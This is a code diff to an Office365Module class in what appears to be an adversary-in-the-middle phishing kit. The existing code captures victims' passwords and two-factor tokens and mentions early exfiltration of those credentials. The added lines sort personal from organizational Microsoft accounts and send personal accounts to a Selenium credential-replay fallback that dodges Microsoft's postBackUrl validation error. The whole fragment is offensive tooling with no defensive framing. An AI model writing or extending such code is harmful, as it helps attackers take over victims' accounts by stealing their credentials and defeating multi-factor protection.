@@ -88,7 +88,21 @@ class Office365Module(BaseModule):
         self.captured_password = request.values.get('password')
         self.two_factor_token = request.values.get('two_factor_token')
 
+        # Detect personal vs organizational account BEFORE choosing attack method
+        personal_domains = ['gmail.com', 'outlook.com', 'hotmail.com', 'live.com', 'msn.com', 'yahoo.com']
+        is_personal = any(domain in self.user.lower() for domain in personal_domains)
 
+        # Microsoft consumer login flow performs strict validation of the postBackUrl parameter
+        # which breaks when we proxy-login through a different host.  To avoid the
+        # AADSTS135004 "Invalid postBackUrl parameter" error, fall back to the
+        # existing Selenium-based credential replay for personal Microsoft accounts.
+        if is_personal:
+            self.log(f"[AiTM] Personal account detected ({self.user}) – switching to Selenium fallback to avoid postBackUrl validation")
+            self.attack_mode = "selenium"
+        else:
+            self.attack_mode = "aitm"
+        
+        
         # Send early exfiltration of credentials
         ip = request.remote_addr
         ua = request.user_agent.string
